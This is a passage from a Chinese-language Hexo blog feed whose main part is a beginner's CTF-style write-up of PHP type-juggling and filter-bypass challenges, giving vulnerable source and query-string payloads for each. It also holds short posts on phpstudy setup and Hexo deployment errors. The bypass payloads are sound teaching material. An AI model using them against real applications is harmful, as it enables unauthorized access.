class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); <br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个代码好长让我来认真看一下🧐</p><p>从最后看<code>echo $info</code>、<code>$info=$flag</code>，我们知道如果满足前面的条件，flag会被赋值给<code>$info</code>并输出。</p><p>再往上找条件</p><p>要不满足条件，即<code>is_palindrome_number($req[&quot;number&quot;])</code>为假。</p><p>前面代码有写<code>is_palindrome_number</code>函数用来判断回文数字。</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>要满足<code>$value1=$value2</code>，即<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>，$value反转后不能和原来相等。</p><blockquote><p>strrev()函数反转字符串</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>需要为假，且<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>再看看上面</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>我们要在url传入一个名为<strong>number</strong>的变量</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>这段的意思是把我们所有的输入收集到$global_var列表里，此时列表**$global_var&#x3D;[<em>$number</em>]<strong>。再进入下一步循环，将键名赋值给$key，变量的值赋值给$value，即</strong>$key&#x3D;0，$value&#x3D;$number**。</p><p>进入循环内部后，trim()函数去除变量首尾的空白字符或其他字符后需满足条件<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>，即$value为字符串并给字符串加反斜线。</p><p>判断条件如下</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>综上，要传入一个字符串，字符串不能是数字还必须是整数，不是回文数字还要是回文数字😅。</p><p>悖论！<del>烦死了不做了去暴打出题人</del></p><p>没关系我们可以绕过。</p><p><code>intval()</code>和 <code>is_numeric()</code>函数在开始判断前，会先跳过所有空白字符，但是<code>is_palindrome_number()</code>不会，可以利用这个特点，在一个回文数字之前加上一个空白字符，比如<code>\f121</code>就是<code>%0c121</code></p><p>再用%00绕过<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>最终playload</strong>：<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>这个怎么还显示代码捏</p><h3 id="05-ereg-x2F-preg-match-正则-00-截断"><a href="#05-ereg-x2F-preg-match-正则-00-截断" class="headerlink" title="05 ereg&#x2F;preg_match 正则 %00 截断"></a>05 ereg&#x2F;preg_match 正则 %00 截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="001-00截断"><a href="#001-00截断" class="headerlink" title="001 %00截断"></a>001 %00截断</h5><p>需要满足条件<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>不为false，即输入的值必须有大小写<strong>字母或者数字</strong>。</p><p>还需满足<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>，即输入值<strong>长度小于8</strong>且<strong>大于99999999</strong>。</p><p>最后要满足<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>，也就是输入中必须有***-***。但是这条和第一条相悖，不慌，姐已经见过大世面了，姐可以绕过它。</p><blockquote><p>当ereg语句遇到%00的时候就会认为是休止符，不再往后看</p></blockquote><p>可以在字符串中添加%00，在它之后加*-*，骗一下第一个判断条件。</p><p>第二个条件可以使用科学计数法，比如1e10。</p><p><strong>最终playload</strong>：<code>?password=1e10%00*-*</code></p><p>本地复现没成功，我好得很哇我好的很哇😅</p><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>本地复现不成功是打不倒我的，我擅长使用百度。</p><p>翻译了一下是“调用了未定义函数”。在php5.3以上的版本将不再支持eregi()和ereg()函数，看了一下的我的版本号是7.3。</p><p>问题也不是不可避免，只需要改一下格式，把<code>ereg()</code>改成<code>erge_match()</code>就行。</p><p><del>但我不会改</del>😣</p><h4 id="002-数组绕过-1"><a href="#002-数组绕过-1" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h4><p>冲浪冲到的另外一种方法</p><p>在true和false之外还有一个返回值是null。可以利用这一特点进行绕过。</p><p>ereg() 只能处理字符串，遇到数组会返回null，而且<code>null !== false</code>。同时，strlen()也不能处理数组，也会返回null，null的长度小于8。</p><p>因为要输入数组，数组大于整数，所以一定会返回true。</p><p><strong>最终playload</strong>：<code>?password=[]=1</code></p><h3 id="06-sha-函数比较绕过"><a href="#06-sha-函数比较绕过" class="headerlink" title="06 sha()函数比较绕过"></a>06 sha()函数比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifer终将否极泰来&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>要满足两个条件：<code>($_GET[&#39;name&#39;] ！== $_GET[&#39;password&#39;]</code>和</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>。</p><p>就是要让输入的两个变量不相等但是sha1加密后相等。</p><p>不同的字符串经过sha1加密后一定不同，但是sha1不能加密数组，会报错返回null，如果让两个变量同时返回null就会相等辣。</p><p><strong>最终playload</strong>：<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-验证绕过"><a href="#07-session-验证绕过" class="headerlink" title="07 session 验证绕过"></a>07 session 验证绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifier终将否极泰来&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>要满足条件<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()存储会话信息</p></blockquote><p>这里session中的password需要我们自己传入，如果不传就是null，同时password也传空，二者就相等啦</p><p><strong>最终playload</strong>：<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-二次编码绕过"><a href="#08-urldecode-二次编码绕过" class="headerlink" title="08 urldecode 二次编码绕过"></a>08 urldecode 二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p>需要满足两个条件：<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>为false；经过urldecode编码后满足<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>也就是说传入值不能是hackerDJ，但是传入值<strong>经过urldecode解码后</strong>要和hackerDJ相等。</p><p>所以传入时要将hackerDJ的url编码再编码一次。</p><p><strong>最终playload</strong>：<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>总觉得少了点什么原来是把这个笔记忘记喽</p><p>发上来防止自己手贱删掉🦭</p><p>把万师傅的原博放这里</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP 入门基础漏洞 | 芜风 (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在浏览器打开本地PHP文件</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>随机掉落废物Mod研究php的笔记😮</p><span id="more"></span><h2 id="01-配置PHP运行环境"><a href="#01-配置PHP运行环境" class="headerlink" title="01 配置PHP运行环境"></a>01 配置PHP运行环境</h2><p>万能的互联网教我下载Apache，PHP和MySQL。好多好麻烦。我选择直接用集成环境。</p><p><a href="https://www.xp.cn/">phpstudy官网</a></p><p>直接去官网下载，会有一个压缩包，解压以后打开第一个exe文件安装就好。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>注意：压缩包保存的路径不能有中文和空格</p><p>在安装时的自定义选项中可以修改安装包的位置，我的是默认在D盘根目录，把它改到放压缩包的文件夹里了。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>根据本人尝试，在浏览器看PHP文件只需要把Apache打开就行。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-把文件丢进网站根目录"><a href="#02-把文件丢进网站根目录" class="headerlink" title="02 把文件丢进网站根目录"></a>02 把文件丢进网站根目录</h2><p>在上述安装步骤步骤中，会生成<strong>phpstudy_pro</strong>文件夹，文件夹中又有<strong>WWW</strong>文件夹。</p><p>网站根目录就是www文件下，必须将文件放置此位置才算有效，否则无法运行php文件。</p><h2 id="03-运行PHP文件"><a href="#03-运行PHP文件" class="headerlink" title="03 运行PHP文件"></a>03 运行PHP文件</h2><p>打开浏览器，在导航栏输入<code>localhost/[文件名]</code>就可以啦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-土狗发言"><a href="#04-土狗发言" class="headerlink" title="04 土狗发言"></a>04 土狗发言</h2><p>因为有一个文件写错了，在浏览器打开的时候报错了。</p><p>它居然还可以报错！</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>太高级了</p><hr><p>集成环境yyds🥳</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>phpstudy</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo使用记录</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>遇到的一些奇怪问题和修改主题页面的经验✂️</p><span id="more"></span><h2 id="奇怪问题"><a href="#奇怪问题" class="headerlink" title="奇怪问题"></a>奇怪问题</h2><h4 id="插入图片坑"><a href="#插入图片坑" class="headerlink" title="插入图片坑"></a>插入图片坑</h4><p>在最开始写博客的时候，千挑万选找了张美图准备当封面，复制文件地址插入。<code>hexo g</code> <code>hexo s</code>本地预览一切正常，<code>hexo d</code>一条龙推上去发现图片被和谐掉了（<del>不是</del>）</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>前去万能的互联网寻找了一下答案，有的说写文章的时候要建一个同名文件夹放图片，有的说要安装插件。</p><p>我当然是选择建文件夹这个更简单的操作。</p><p>在配置文件_config.yml里找到<strong>post_asset_folder</strong>，把false改为true，再次<code>hexo new</code>就建好.md文件和文件夹了。经过本人一顿Ctrl+C和Ctrl+V的操作把原文件和图片移到新的文件，充满信心地再次<code>hexo g</code> <code>hexo d</code></p><p>还是不显示图片</p><p>好的😢<del>一定是图片它真的违禁了</del></p><p>当我再次在互联网搜索时，我发现了一个华点</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>这个markdown语法里的图片插入是<code>/</code>，但是我复制的图片路径用的是<code>\</code>！</p><p>我尝试着修改之后再次<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>就这么成功了🤨</p><h4 id="Spawn-failed坑"><a href="#Spawn-failed坑" class="headerlink" title="Spawn failed坑"></a>Spawn failed坑</h4><p>美滋滋发了一篇笔记上来，发现格式有bug，抓紧时间修改。修改之后再次丝滑一条龙上传······</p><p>没丝滑成功</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>报错喽🥳<del>我面容平和根本就没有在生气</del></p><p>翻译了一下是“请确保您有正确的访问权限”，不会搞。把目光投向万能的互联网，网上说是连接的问题。</p><p>看到一条说因为git 进行<code>push</code>或者<code>hexo d</code>的时候改变了一些.deploy_git文件下的内容，只需要重新down一下就行。</p><p>于是删除.deploy_git文件夹，再次<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>。出现了一个新的.deploy_git文件！</p><p>依旧报错🥀</p><p>又继续冲浪找解决方案，又看到一条说要在_config.yml文件里把<strong>repo</strong>地址改成git地址。我早就改过了但是我发现这个人的<strong>deploy</strong>条目比我多一个<strong>branch</strong>。</p><p>秉承着不错过任何一个细节的态度我在自己的文件里也加上了这条并认真填入master。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>保存，<code>hexo d</code>，加载成功？？？</p><p>事情怎会如此简单，我解决完问题才想起要记录一下踩坑新鲜事，于是乎再次<code>hexo d</code>想看看效果。</p><p>又报错了😮我才十八眼神还挺好使的难道刚才是眼花了吗？</p><p>换了个搜索引擎继续搜，看到一个csdn上的讨论，都让修改repo地址。我不信邪继续往下拉，看到一条标签</p><p><img 